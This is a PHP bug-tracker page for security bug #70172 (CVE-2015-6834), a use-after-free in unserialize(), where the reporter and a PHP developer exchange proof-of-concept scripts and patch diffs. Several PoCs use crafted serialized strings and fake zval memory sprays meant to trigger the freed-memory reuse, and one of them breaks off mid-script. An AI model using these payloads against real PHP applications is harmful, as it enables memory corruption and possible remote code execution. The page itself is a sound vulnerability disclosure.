<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #70172 - RDF' href='rss/bug.php?id=70172'>
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #70172 - RSS 2.0' href='rss/bug.php?id=70172&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #70172 :: Use After Free Vulnerability in unserialize() </title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=70172">Sec Bug</a>&nbsp;#70172</th>
            <td id="summary" colspan="5">Use After Free Vulnerability in unserialize() </td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2015-07-31 01:38 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-10-23 19:47 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.4.43</td>
            <th class="details">OS:</th>
            <td>*</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6834" target="_blank">2015-6834</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=70172&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=70172&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=70172&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1438306715">&nbsp;</a><strong>[2015-07-31 01:38 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
I has reported some similar bugs in BUG#70166, BUG#70168 and BUG#70169

```
	if (ce-&gt;unserialize == NULL) {
		zend_error(E_WARNING, &quot;Class %s has no unserializer&quot;, ZSTR_VAL(ce-&gt;name));
		object_init_ex(rval, ce);
	} else if (ce-&gt;unserialize(rval, ce, (const unsigned char*)*p, datalen, (zend_unserialize_data *)var_hash) != SUCCESS) {
		return 0;
	}

	(*p) += datalen;

	return finish_nested_data(UNSERIALIZE_PASSTHRU);
}

A specially defined Serializable lead to various problems.

PoC:

```
class obj implements Serializable {
    var $data;
    function serialize() {
        return serialize($this-&gt;data);
    }
    function unserialize($data) {
        $this-&gt;data = unserialize($data);
        $this-&gt;data = 1;
    }
}

$inner = 'a:0:{}';
$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;R:3;}';

$data = unserialize($exploit);

for($i = 0; $i &lt; 5; $i++) {
    $v[$i] = 'hi'.$i;
}

var_dump($data);
```

We can create ZVAL and free it via Serializable::unserialize. However the unserialize() will still allow to use R: or r: to set references to that already freed memory. it is possible to use-after-free attack and execute arbitrary code remotely.


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=70172'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=70172'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1438347560">&nbsp;</a><strong>[2015-07-31 12:59 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>the patch for 5.4 series ( maybe work on 5.5 and 5.6 series ), and this patch also fixes BUG#70166, BUG#70168 and BUG#70169.

diff --git a/php-5.4.43/var_unserializer.c b/php-5.4.43-fixed/var_unserializer.c
index 8c4e629..99b61cb 100644
--- a/php-5.4.43/var_unserializer.c
+++ b/php-5.4.43-fixed/var_unserializer.c
@@ -363,8 +363,10 @@ static inline int process_nested_data(UNSERIALIZE_PARAMETER, HashTable *ht, long
 
 static inline int finish_nested_data(UNSERIALIZE_PARAMETER)
 {
-	if (*((*p)++) == '}')
+	if (*((*p)++) == '}') {
+		var_push_dtor(var_hash, rval);
 		return 1;
+	}
 
 #if SOMETHING_NEW_MIGHT_LEAD_TO_CRASH_ENABLE_IF_YOU_ARE_BRAVE
 	zval_ptr_dtor(rval);
@@ -880,6 +882,7 @@ yy41:
 
 	INIT_PZVAL(*rval);
 	ZVAL_STRINGL(*rval, str, len, 0);
+	var_push_dtor(var_hash, rval);
 	return 1;
 }
 yy46:
@@ -927,6 +930,7 @@ yy48:
 
 	INIT_PZVAL(*rval);
 	ZVAL_STRINGL(*rval, str, len, 1);
+	var_push_dtor(var_hash, rval);
 	return 1;
 }
 yy53:
@@ -1023,6 +1027,7 @@ use_double:
 	*p = YYCURSOR;
 	INIT_PZVAL(*rval);
 	ZVAL_DOUBLE(*rval, zend_strtod((const char *)start + 2, NULL));
+	var_push_dtor(var_hash, rval);
 	return 1;
 }
 yy65:
@@ -1094,6 +1099,8 @@ yy73:
 	} else if (!strncmp(start + 2, &quot;-INF&quot;, 4)) {
 		ZVAL_DOUBLE(*rval, -php_get_inf());
 	}
+	
+	var_push_dtor(var_hash, rval);
 
 	return 1;
 }
@@ -1147,6 +1154,7 @@ yy79:
 	*p = YYCURSOR;
 	INIT_PZVAL(*rval);
 	ZVAL_LONG(*rval, parse_iv(start + 2));
+	var_push_dtor(var_hash, rval);
 	return 1;
 }
 yy83:
@@ -1160,6 +1168,7 @@ yy83:
 	*p = YYCURSOR;
 	INIT_PZVAL(*rval);
 	ZVAL_BOOL(*rval, parse_iv(start + 2));
+	var_push_dtor(var_hash, rval);
 	return 1;
 }
 yy87:
@@ -1168,6 +1177,7 @@ yy87:
 	*p = YYCURSOR;
 	INIT_PZVAL(*rval);
 	ZVAL_NULL(*rval);
+	var_push_dtor(var_hash, rval);
 	return 1;
 }
 yy89:
</pre>
</div><div class='comment type_comment' ><a name="1438487440">&nbsp;</a><strong>[2015-08-02 03:50 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>This looks like it requires specially crafted code. As such, it's not a security issue.
</pre>
</div><div class='comment type_log' ><a name="1438487460">&nbsp;</a><strong>[2015-08-02 03:51 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_comment' ><a name="1438488958">&nbsp;</a><strong>[2015-08-02 04:15 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Some web programs use Serializable and unserialize(), and attacker can free ZVAL easily via DateInterval, like this:

```
class obj implements Serializable {
    var $data;
    function serialize() {
        return serialize($this-&gt;data);
    }
    function unserialize($data) {
        $this-&gt;data = unserialize($data);
    }
}

$inner = 'O:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;;R:2;}';
$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;R:3;}';

$data = unserialize($exploit);

for($i = 0; $i &lt; 5; $i++) {
    $v[$i] = 'hi'.$i;
}

var_dump($data);
```
</pre>
</div><div class='comment type_comment' ><a name="1438497060">&nbsp;</a><strong>[2015-08-02 06:31 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The patch should be against var_unserializer.re, var_unserializer.c is a generated file. Also, I'm not sure pushing every single value is a good thing, this would slow down unserialization a lot.
</pre>
</div><div class='comment type_log' ><a name="1438730595">&nbsp;</a><strong>[2015-08-04 23:23 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Bug</span>
<span class="added">+Type: Security</span>
</div></div></div><div class='comment type_comment' ><a name="1438730600">&nbsp;</a><strong>[2015-08-04 23:23 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>I noticed that the latest commits in github, disable convert_to_* on DateInterval::__wakeup(), maybe this patch can fix part of this bug and all other bugs, but this bug still can be trigger easily, like this:

```
class obj implements Serializable {
    var $data;
    function serialize() {
        return serialize($this-&gt;data);
    }
    function unserialize($data) {
        $this-&gt;data = unserialize($data);
    }
}

$inner = 'a:1:{i:1;a:0:{';
$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;R:4;}';

$data = unserialize($exploit);

for($i = 0; $i &lt; 5; $i++) {
    $v[$i] = 'hi'.$i;
}

var_dump($data);
```
</pre>
</div><div class='comment type_comment' ><a name="1438731608">&nbsp;</a><strong>[2015-08-04 23:40 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Yes, I know. I'll look for a solution for this issue.
</pre>
</div><div class='comment type_comment' ><a name="1438863141">&nbsp;</a><strong>[2015-08-06 12:12 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>free memory via the process_nested_data() with a invalid serialized string

```
static inline int process_nested_data(UNSERIALIZE_PARAMETER, HashTable *ht, long elements, int objprops)
{
    while (elements-- &gt; 0) {
        zval *key, *data, **old_data;

        ...

        ALLOC_INIT_ZVAL(data);

        if (!php_var_unserialize(&amp;data, p, max, var_hash TSRMLS_CC)) {
            zval_dtor(key);
            FREE_ZVAL(key);
            zval_dtor(data);
            FREE_ZVAL(data);  &lt;===  free memory
            return 0;
        }
```

PoC:

```
class obj implements Serializable {
    var $data;
    function serialize() {
        return serialize($this-&gt;data);
    }
    function unserialize($data) {
        $this-&gt;data = unserialize($data);
    }
}

$inner = 'a:2:{i:0;i:1;i:1;i:2';
$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;R:5;}';

$data = unserialize($exploit);

for($i = 0; $i &lt; 5; $i++) {
    $v[$i] = 'hi'.$i;
}

var_dump($data);
```

so my previous patches can also be bypassed.
</pre>
</div><div class='comment type_comment' ><a name="1438873591">&nbsp;</a><strong>[2015-08-06 15:06 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>update new patch for this bug, it will ban references to serialization of Serializable interface, but doing so may result in missing some features.

diff --git a/php-5.4.43/var.c b/php-5.4.43-fixed/var.c
index 7603ff2..837e65f 100644
--- a/php-5.4.43/var.c
+++ b/php-5.4.43-fixed/var.c
@@ -775,6 +775,10 @@ static void php_var_serialize_intern(smart_str *buf, zval *struc, HashTable *var
 					/* has custom handler */
 					unsigned char *serialized_data = NULL;
 					zend_uint serialized_length;
+					
+					if (ZEND_INTERNAL_CLASS != ce-&gt;type) {
+						BG(serialize_lock)++;
+					}
 
 					if (ce-&gt;serialize(struc, &amp;serialized_data, &amp;serialized_length, (zend_serialize_data *)var_hash TSRMLS_CC) == SUCCESS) {
 						smart_str_appendl(buf, &quot;C:&quot;, 2);
@@ -790,6 +794,11 @@ static void php_var_serialize_intern(smart_str *buf, zval *struc, HashTable *var
 					} else {
 						smart_str_appendl(buf, &quot;N;&quot;, 2);
 					}
+					
+					if (ZEND_INTERNAL_CLASS != ce-&gt;type) {
+						BG(serialize_lock)--;
+					}
+					
 					if (serialized_data) {
 						efree(serialized_data);
 					}
diff --git a/php-5.4.43/var_unserializer.c b/php-5.4.43-fixed/var_unserializer.c
index 8c4e629..7c76022 100644
--- a/php-5.4.43/var_unserializer.c
+++ b/php-5.4.43-fixed/var_unserializer.c
@@ -388,6 +388,13 @@ static inline int object_custom(UNSERIALIZE_PARAMETER, zend_class_entry *ce)
 	if (ce-&gt;unserialize == NULL) {
 		zend_error(E_WARNING, &quot;Class %s has no unserializer&quot;, ce-&gt;name);
 		object_init_ex(*rval, ce);
+	} else if (ZEND_INTERNAL_CLASS != ce-&gt;type) {
+		BG(serialize_lock)++;
+		if (ce-&gt;unserialize(rval, ce, (const unsigned char*)*p, datalen, (zend_unserialize_data *)var_hash TSRMLS_CC) != SUCCESS) {
+			BG(serialize_lock)--;
+			return 0;
+		}
+		BG(serialize_lock)--;
 	} else if (ce-&gt;unserialize(rval, ce, (const unsigned char*)*p, datalen, (zend_unserialize_data *)var_hash TSRMLS_CC) != SUCCESS) {
 		return 0;
 	}
</pre>
</div><div class='comment type_comment' ><a name="1438876240">&nbsp;</a><strong>[2015-08-06 15:50 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>I don't think breaking reference serialization is an option, at least for 5.x branches.
</pre>
</div><div class='comment type_comment' ><a name="1439046932">&nbsp;</a><strong>[2015-08-08 15:15 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>update new patch for fix this bug:

diff --git a/php-5.4.43/var.c b/php-5.4.43-fixed/var.c
index 7603ff2..8248003 100644
--- a/php-5.4.43/var.c
+++ b/php-5.4.43-fixed/var.c
@@ -966,10 +966,17 @@ PHP_FUNCTION(unserialize)
 		PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
 		zval_dtor(return_value);
 		if (!EG(exception)) {
-			php_error_docref(NULL TSRMLS_CC, E_NOTICE, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - buf), buf_len);
+			if (!BG(unserialize).level) {
+				php_error_docref(NULL TSRMLS_CC, E_NOTICE, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - buf), buf_len);
+			} else {
+				zend_throw_exception_ex(NULL, 0 TSRMLS_CC, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - buf), buf_len);
+			}
 		}
 		RETURN_FALSE;
 	}
+	if (BG(unserialize).level != 1) {
+		var_push_dtor(&amp;var_hash, &amp;return_value);
+	}
 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
 }
 /* }}} */
</pre>
</div><div class='comment type_comment' ><a name="1439766420">&nbsp;</a><strong>[2015-08-16 23:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Unfortunately, in 5.x core functions are not allowed to throw exceptions, so the latest patch can not work for 5.x.
</pre>
</div><div class='comment type_comment' ><a name="1439766860">&nbsp;</a><strong>[2015-08-16 23:14 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>this patch is worked for my 5.x series.

and maybe you can use fatal error level messsage replacement throw exceptions.
</pre>
</div><div class='comment type_comment' ><a name="1440160868">&nbsp;</a><strong>[2015-08-21 12:41 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>i update a new PoC, it use fatal error level messsage replacement throw exceptions, and fix a another UaF.

```
diff --git a/./php-5.6.12/var.c b/./php-5.6.12-fixed/var.c
index 3f2c0d7..8e9589c 100644
--- a/./php-5.6.12/var.c
+++ b/./php-5.6.12-fixed/var.c
@@ -959,14 +959,24 @@ PHP_FUNCTION(unserialize)
 
 	p = (const unsigned char*) buf;
 	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+	if (BG(unserialize).level != 1 &amp;&amp; (p[0] == 'r' || p[0] == 'R')) {
+		Z_ADDREF_PP(&amp;return_value);
+	}
 	if (!php_var_unserialize(&amp;return_value, &amp;p, p + buf_len, &amp;var_hash TSRMLS_CC)) {
 		PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
 		zval_dtor(return_value);
 		if (!EG(exception)) {
-			php_error_docref(NULL TSRMLS_CC, E_NOTICE, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - buf), buf_len);
+			if (!BG(unserialize).level) {
+				php_error_docref(NULL TSRMLS_CC, E_NOTICE, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - buf), buf_len);
+			} else {
+				php_error_docref(NULL TSRMLS_CC, E_ERROR, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - buf), buf_len);
+			}
 		}
 		RETURN_FALSE;
 	}
+	if (BG(unserialize).level != 1) {
+		var_push_dtor(&amp;var_hash, &amp;return_value);
+	}
 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
 }
 /* }}} */
```

when the reference count of the ZVAL to zero, ZVAL will be freed from memory

```
	if (*rval != NULL) {
		var_push_dtor_no_addref(var_hash, rval);
	}
	*rval = *rval_ref;
	
	...
	
	
	if (*rval != NULL) {
		zval_ptr_dtor(rval);
	}
	*rval = *rval_ref;
```

PoC:

```
class obj implements Serializable {
	var $data;
	function serialize() {
		return serialize($this-&gt;data);
	}
	function unserialize($data) {
		$this-&gt;data = unserialize($data);
	}
}

$fakezval = ptr2str(1122334455);
$fakezval .= ptr2str(0);
$fakezval .= &quot;\x00\x00\x00\x00&quot;;
$fakezval .= &quot;\x01&quot;;
$fakezval .= &quot;\x00&quot;;
$fakezval .= &quot;\x00\x00&quot;;

$inner = 'r:2;';
$exploit = 'a:2:{i:0;i:1;i:1;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}}';

$data = unserialize($exploit);

for ($i = 0; $i &lt; 5; $i++) {
	$v[$i] = $fakezval.$i;
}

var_dump($data);

function ptr2str($ptr)
{
	$out = '';
	for ($i = 0; $i &lt; 8; $i++) {
		$out .= chr($ptr &amp; 0xff);
		$ptr &gt;&gt;= 8;
	}
	return $out;
}
```
</pre>
</div><div class='comment type_comment' ><a name="1440689067">&nbsp;</a><strong>[2015-08-27 15:24 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>update a new patch for fix all bugs in this report stream:

diff --git a/php-5.6.12/var.c b/php-5.6.12-fixed/var.c
index 3f2c0d7..c639910 100644
--- a/php-5.6.12/var.c
+++ b/php-5.6.12-fixed/var.c
@@ -967,6 +967,7 @@ PHP_FUNCTION(unserialize)
 		}
 		RETURN_FALSE;
 	}
+	var_push_dtor(&amp;var_hash, &amp;return_value);
 	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
 }
 /* }}} */
diff --git a/php-5.6.12/var_unserializer.c b/php-5.6.12-fixed/var_unserializer.c
index f322ef1..61fca39 100644
--- a/php-5.6.12/var_unserializer.c
+++ b/php-5.6.12-fixed/var_unserializer.c
@@ -90,7 +90,13 @@ PHPAPI void var_push_dtor(php_unserialize_data_t *var_hashx, zval **rval)
 
 PHPAPI void var_push_dtor_no_addref(php_unserialize_data_t *var_hashx, zval **rval)
 {
-	var_entries *var_hash = (*var_hashx)-&gt;last_dtor;
+	var_entries *var_hash;
+	
+	if (!var_hashx || !*var_hashx) {
+		return;
+	}
+	
+	var_hash = (*var_hashx)-&gt;last_dtor;
 #if VAR_ENTRIES_DBG
 	fprintf(stderr, &quot;var_push_dtor_no_addref(%ld): %d (%d)\n&quot;, var_hash?var_hash-&gt;used_slots:-1L, Z_TYPE_PP(rval), Z_REFCOUNT_PP(rval));
 #endif
@@ -301,23 +307,20 @@ static inline int process_nested_data(UNSERIALIZE_PARAMETER, HashTable *ht, long
 		ALLOC_INIT_ZVAL(key);
 
 		if (!php_var_unserialize(&amp;key, p, max, NULL TSRMLS_CC)) {
-			zval_dtor(key);
-			FREE_ZVAL(key);
+			var_push_dtor_no_addref(var_hash, &amp;key);
 			return 0;
 		}
 
 		if (Z_TYPE_P(key) != IS_LONG &amp;&amp; Z_TYPE_P(key) != IS_STRING) {
-			zval_dtor(key);
-			FREE_ZVAL(key);
+			var_push_dtor_no_addref(var_hash, &amp;key);
 			return 0;
 		}
 
 		ALLOC_INIT_ZVAL(data);
 
 		if (!php_var_unserialize(&amp;data, p, max, var_hash TSRMLS_CC)) {
-			zval_dtor(key);
-			FREE_ZVAL(key);
-			zval_ptr_dtor(&amp;data);
+			var_push_dtor_no_addref(var_hash, &amp;key);
+			var_push_dtor_no_addref(var_hash, &amp;data);
 			return 0;
 		}
 
@@ -347,8 +350,7 @@ static inline int process_nested_data(UNSERIALIZE_PARAMETER, HashTable *ht, long
 		}
 		var_push_dtor(var_hash, &amp;data);
 		
-		zval_dtor(key);
-		FREE_ZVAL(key);
+		var_push_dtor_no_addref(var_hash, &amp;key);
 
 		if (elements &amp;&amp; *(*p-1) != ';' &amp;&amp; *(*p-1) != '}') {
 			(*p)--;
@@ -1200,7 +1202,7 @@ yy91:
 	if (*rval == *rval_ref) return 0;
 
 	if (*rval != NULL) {
-		var_push_dtor_no_addref(var_hash, rval);
+		var_push_dtor(var_hash, rval);
 	}
 	*rval = *rval_ref;
 	Z_ADDREF_PP(rval);
@@ -1242,7 +1244,7 @@ yy97:
 	}
 
 	if (*rval != NULL) {
-		zval_ptr_dtor(rval);
+		var_push_dtor(var_hash, rval);
 	}
 	*rval = *rval_ref;
 	Z_ADDREF_PP(rval);
diff --git a/php-5.6.12/var_unserializer.re b/php-5.6.12-fixed/var_unserializer.re
index 295acc5..894b5ec 100644
--- a/php-5.6.12/var_unserializer.re
+++ b/php-5.6.12-fixed/var_unserializer.re
@@ -89,7 +89,13 @@ PHPAPI void var_push_dtor(php_unserialize_data_t *var_hashx, zval **rval)
 
 PHPAPI void var_push_dtor_no_addref(php_unserialize_data_t *var_hashx, zval **rval)
 {
-	var_entries *var_hash = (*var_hashx)-&gt;last_dtor;
+	var_entries *var_hash;
+
+	if (!var_hashx || !*var_hashx) {
+		return;
+	}
+
+	var_hash = (*var_hashx)-&gt;last_dtor;
 #if VAR_ENTRIES_DBG
 	fprintf(stderr, &quot;var_push_dtor_no_addref(%ld): %d (%d)\n&quot;, var_hash?var_hash-&gt;used_slots:-1L, Z_TYPE_PP(rval), Z_REFCOUNT_PP(rval));
 #endif
@@ -307,23 +313,20 @@ static inline int process_nested_data(UNSERIALIZE_PARAMETER, HashTable *ht, long
 		ALLOC_INIT_ZVAL(key);
 
 		if (!php_var_unserialize(&amp;key, p, max, NULL TSRMLS_CC)) {
-			zval_dtor(key);
-			FREE_ZVAL(key);
+			var_push_dtor_no_addref(var_hash, &amp;key);
 			return 0;
 		}
 
 		if (Z_TYPE_P(key) != IS_LONG &amp;&amp; Z_TYPE_P(key) != IS_STRING) {
-			zval_dtor(key);
-			FREE_ZVAL(key);
+			var_push_dtor_no_addref(var_hash, &amp;key);
 			return 0;
 		}
 
 		ALLOC_INIT_ZVAL(data);
 
 		if (!php_var_unserialize(&amp;data, p, max, var_hash TSRMLS_CC)) {
-			zval_dtor(key);
-			FREE_ZVAL(key);
-			zval_ptr_dtor(&amp;data);
+			var_push_dtor_no_addref(var_hash, &amp;key);
+			var_push_dtor_no_addref(var_hash, &amp;data);
 			return 0;
 		}
 
@@ -353,8 +356,7 @@ static inline int process_nested_data(UNSERIALIZE_PARAMETER, HashTable *ht, long
 		}
 		var_push_dtor(var_hash, &amp;data);
 		
-		zval_dtor(key);
-		FREE_ZVAL(key);
+		var_push_dtor_no_addref(var_hash, &amp;key);
 
 		if (elements &amp;&amp; *(*p-1) != ';' &amp;&amp; *(*p-1) != '}') {
 			(*p)--;
@@ -495,7 +497,7 @@ PHPAPI int php_var_unserialize(UNSERIALIZE_PARAMETER)
 	}
 
 	if (*rval != NULL) {
-		zval_ptr_dtor(rval);
+		var_push_dtor(var_hash, rval);
 	}
 	*rval = *rval_ref;
 	Z_ADDREF_PP(rval);
@@ -518,7 +520,7 @@ PHPAPI int php_var_unserialize(UNSERIALIZE_PARAMETER)
 	if (*rval == *rval_ref) return 0;
 
 	if (*rval != NULL) {
-		var_push_dtor_no_addref(var_hash, rval);
+		var_push_dtor(var_hash, rval);
 	}
 	*rval = *rval_ref;
 	Z_ADDREF_PP(rval);
</pre>
</div><div class='comment type_comment' ><a name="1441082209">&nbsp;</a><strong>[2015-09-01 04:36 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Unfortunately, this patch seems to cause memory leaks on unit tests, e.g.:

/Users/smalyshev/php-5.4/ext/standard/tests/serialize/001.phpt
</pre>
</div><div class='comment type_comment' ><a name="1441086506">&nbsp;</a><strong>[2015-09-01 05:48 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>oh, i think it's maybe the following code causes the problem:

	var_push_dtor(&amp;var_hash, &amp;return_value);

and use the following code:


	PHP_VAR_UNSERIALIZE_INIT(var_hash);
+	if (BG(unserialize).level != 1 &amp;&amp; (p[0] == 'r' || p[0] == 'R')) {
+		Z_ADDREF_P(return_value);
+	}
	if (!php_var_unserialize(&amp;return_value, &amp;p, p + buf_len, &amp;var_hash TSRMLS_CC)) {
		PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
		zval_dtor(return_value);
		if (!EG(exception)) {
			php_error_docref(NULL TSRMLS_CC, E_NOTICE, &quot;Error at offset %ld of %d bytes&quot;, (long)((char*)p - buf), buf_len);
		}
		RETURN_FALSE;
	}
+	if (BG(unserialize).level != 1) {
+		var_push_dtor(&amp;var_hash, &amp;return_value);
+	}
	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);

and the following code does not need to be changed:

 	if (*rval == *rval_ref) return 0;
 
 	if (*rval != NULL) {
-		var_push_dtor_no_addref(var_hash, rval);
+		var_push_dtor(var_hash, rval);
 	}
 	*rval = *rval_ref;
 	Z_ADDREF_PP(rval);
	...
 	}
 
 	if (*rval != NULL) {
-		zval_ptr_dtor(rval);
+		var_push_dtor(var_hash, rval);
 	}
 	*rval = *rval_ref;
 	Z_ADDREF_PP(rval);
</pre>
</div><div class='comment type_comment' ><a name="1441087656">&nbsp;</a><strong>[2015-09-01 06:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Looks like there's a deeper problem here with unserialize() returning result of 'r' or 'R'. This is because zend_vm_execute.h passes it only zval *, but 'r' and 'R' try to replace the pointer. The problem is that while the pointer is replaced locally in PHP_FUNCTION(unserialize), it is not replaced inside actual temp variable in zend_vm_execute.h, which retains pointer to old value. Your patch probably makes this variable not destroyed by doing Z_ADDREF_P, but then it only will lead to a memory leak, since we still assign the result on unserialize() to wrong zval *. It need more comprehensive solution as it seems. What does your PoC script return with you patch? Do you see any memory leaks in debug mode?
</pre>
</div><div class='comment type_comment' ><a name="1441088867">&nbsp;</a><strong>[2015-09-01 06:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Please check out this one: <a href="https://gist.github.com/smalyshev/7b6ce8abb8122afcc936" rel="nofollow">https://gist.github.com/smalyshev/7b6ce8abb8122afcc936</a>
Seems to work for me.
</pre>
</div><div class='comment type_comment' ><a name="1441091982">&nbsp;</a><strong>[2015-09-01 07:19 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>the patch looks is ok, i will test it later.
</pre>
</div><div class='comment type_comment' ><a name="1441101346">&nbsp;</a><strong>[2015-09-01 09:55 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>oh, the patch can be bypass, like this:
```
class obj implements Serializable {
	var $data;
	function serialize() {
		return serialize($this-&gt;data);
	}
	function unserialize($data) {
		$this-&gt;data = unserialize($data);
	}
}

class obj2 {
	var $ryat;
	function __wakeup() {
		$this-&gt;ryat = 1;
	}
}

$fakezval = ptr2str(1122334455);
$fakezval .= ptr2str(0);
$fakezval .= &quot;\x00\x00\x00\x00&quot;;
$fakezval .= &quot;\x01&quot;;
$fakezval .= &quot;\x00&quot;;
$fakezval .= &quot;\x00\x00&quot;;

$inner = 'r:2;';
$exploit = 'a:2:{i:0;O:4:&quot;obj2&quot;:1:{s:4:&quot;ryat&quot;;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}}i:1;a:1:{i:0;a:1:{i:0;R:4;}}}';

$data = unserialize($exploit);

for ($i = 0; $i &lt; 5; $i++) {
